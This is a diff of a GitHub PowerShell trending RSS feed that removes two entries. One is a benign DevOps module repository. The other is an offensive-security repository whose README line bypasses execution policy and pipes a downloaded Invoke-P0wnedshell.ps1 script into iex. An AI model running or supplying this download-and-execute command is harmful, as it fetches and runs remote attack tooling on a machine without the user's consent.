@@ -1,21 +1,7 @@
 <?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
   <title>GitHub PowerShell Daily Trending</title>
   <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
-  <updated>2023-05-09T01:44:56Z</updated>
+  <updated>2023-05-10T01:40:50Z</updated>
   <subtitle>Daily Trending of PowerShell in GitHub</subtitle>
   <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
-  <entry>
-    <title>IAMinZoho/OFFSEC-PowerShell</title>
-    <updated>2023-05-09T01:44:56Z</updated>
-    <id>tag:github.com,2023-05-09:/IAMinZoho/OFFSEC-PowerShell</id>
-    <link href="https://github.com/IAMinZoho/OFFSEC-PowerShell" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;My Favorite Offensive Security Scripts&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;OFFSEC-PowerShell&lt;/h1&gt; &#xA;&lt;p&gt;My Favorite Offensive Security Scripts&lt;/p&gt; &#xA;&lt;p&gt;IEX:&lt;/p&gt; &#xA;&lt;p&gt;Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(&#39;&lt;a href=&#34;https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/main/Invoke-P0wnedshell.ps1&#34;&gt;https://raw.githubusercontent.com/IAMinZoho/OFFSEC-PowerShell/main/Invoke-P0wnedshell.ps1&lt;/a&gt;&#39;))&lt;/p&gt;</summary>
-  </entry>
-  <entry>
-    <title>szymonos/ps-modules</title>
-    <updated>2023-05-09T01:44:56Z</updated>
-    <id>tag:github.com,2023-05-09:/szymonos/ps-modules</id>
-    <link href="https://github.com/szymonos/ps-modules" rel="alternate"></link>
-    <summary type="html">&lt;p&gt;My PowerShell modules&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;ps-modules&lt;/h1&gt; &#xA;&lt;p&gt;Repository for my &lt;em&gt;DevOps&lt;/em&gt; PowerShell modules.&lt;/p&gt; &#xA;&lt;h2&gt;Managing modules&lt;/h2&gt; &#xA;&lt;p&gt;You can manage modules in the repository with &lt;a href=&#34;https://raw.githubusercontent.com/szymonos/ps-modules/main/module_manage.ps1&#34;&gt;module_manage.ps1&lt;/a&gt; script.&lt;br&gt; It allows to install the module, delete module, or scaffold new module manifest in the repository.&lt;br&gt; Script automatically detects the &lt;code&gt;CurrentUser&lt;/code&gt;/&lt;code&gt;AllUsers&lt;/code&gt; scope, depending if it runs elevated.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;&amp;lt;# install module #&amp;gt;&#xA;./module_manage.ps1 -Module &#39;do-test&#39;&#xA;# clean up previous versions during installation&#xA;./module_manage.ps1 -Module &#39;do-test&#39; -CleanUp&#xA;# remove requirements from the manifest file to speed up module loading&#xA;./module_manage.ps1 -Module &#39;do-test&#39; -RemoveRequirements&#xA;&#xA;&amp;lt;# delete module #&amp;gt;&#xA;./module_manage.ps1 -Module &#39;do-test&#39; -Delete&#xA;&#xA;&amp;lt;# scaffold module manifest #&amp;gt;&#xA;./module_manage.ps1 -Module &#39;do-test&#39; -Create&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Modules&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;strong&gt;do-common&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Common module, not depending on other modules, working on all systems.&lt;br&gt; On Linux, it is recommended to install the module in the &lt;code&gt;AllUsers&lt;/code&gt; scope, by running the script as root.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;./module_manage.ps1 &#39;do-common&#39; -CleanUp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;do-az&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Module intended to streamline work with Microsoft Azure Cloud.&lt;br&gt; Required modules to be installed beforehand: &lt;code&gt;do-common&lt;/code&gt;, &lt;code&gt;Az.Accounts&lt;/code&gt;, &lt;code&gt;Az.ResourceGraph&lt;/code&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;./module_manage.ps1 &#39;do-az&#39; -CleanUp -RemoveRequirements&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;do-linux&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Module intended to streamline work on Linux.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;./module_manage.ps1 -Module &#39;do-linux&#39; -CleanUp&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;&lt;strong&gt;do-win&lt;/strong&gt;&lt;/h3&gt; &#xA;&lt;p&gt;Module intended to streamline work on Windows.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-PowerShell&#34;&gt;./module_manage.ps1 -Module &#39;do-win&#39; -CleanUp&#xA;&lt;/code&gt;&lt;/pre&gt;</summary>
-  </entry>
 </feed>
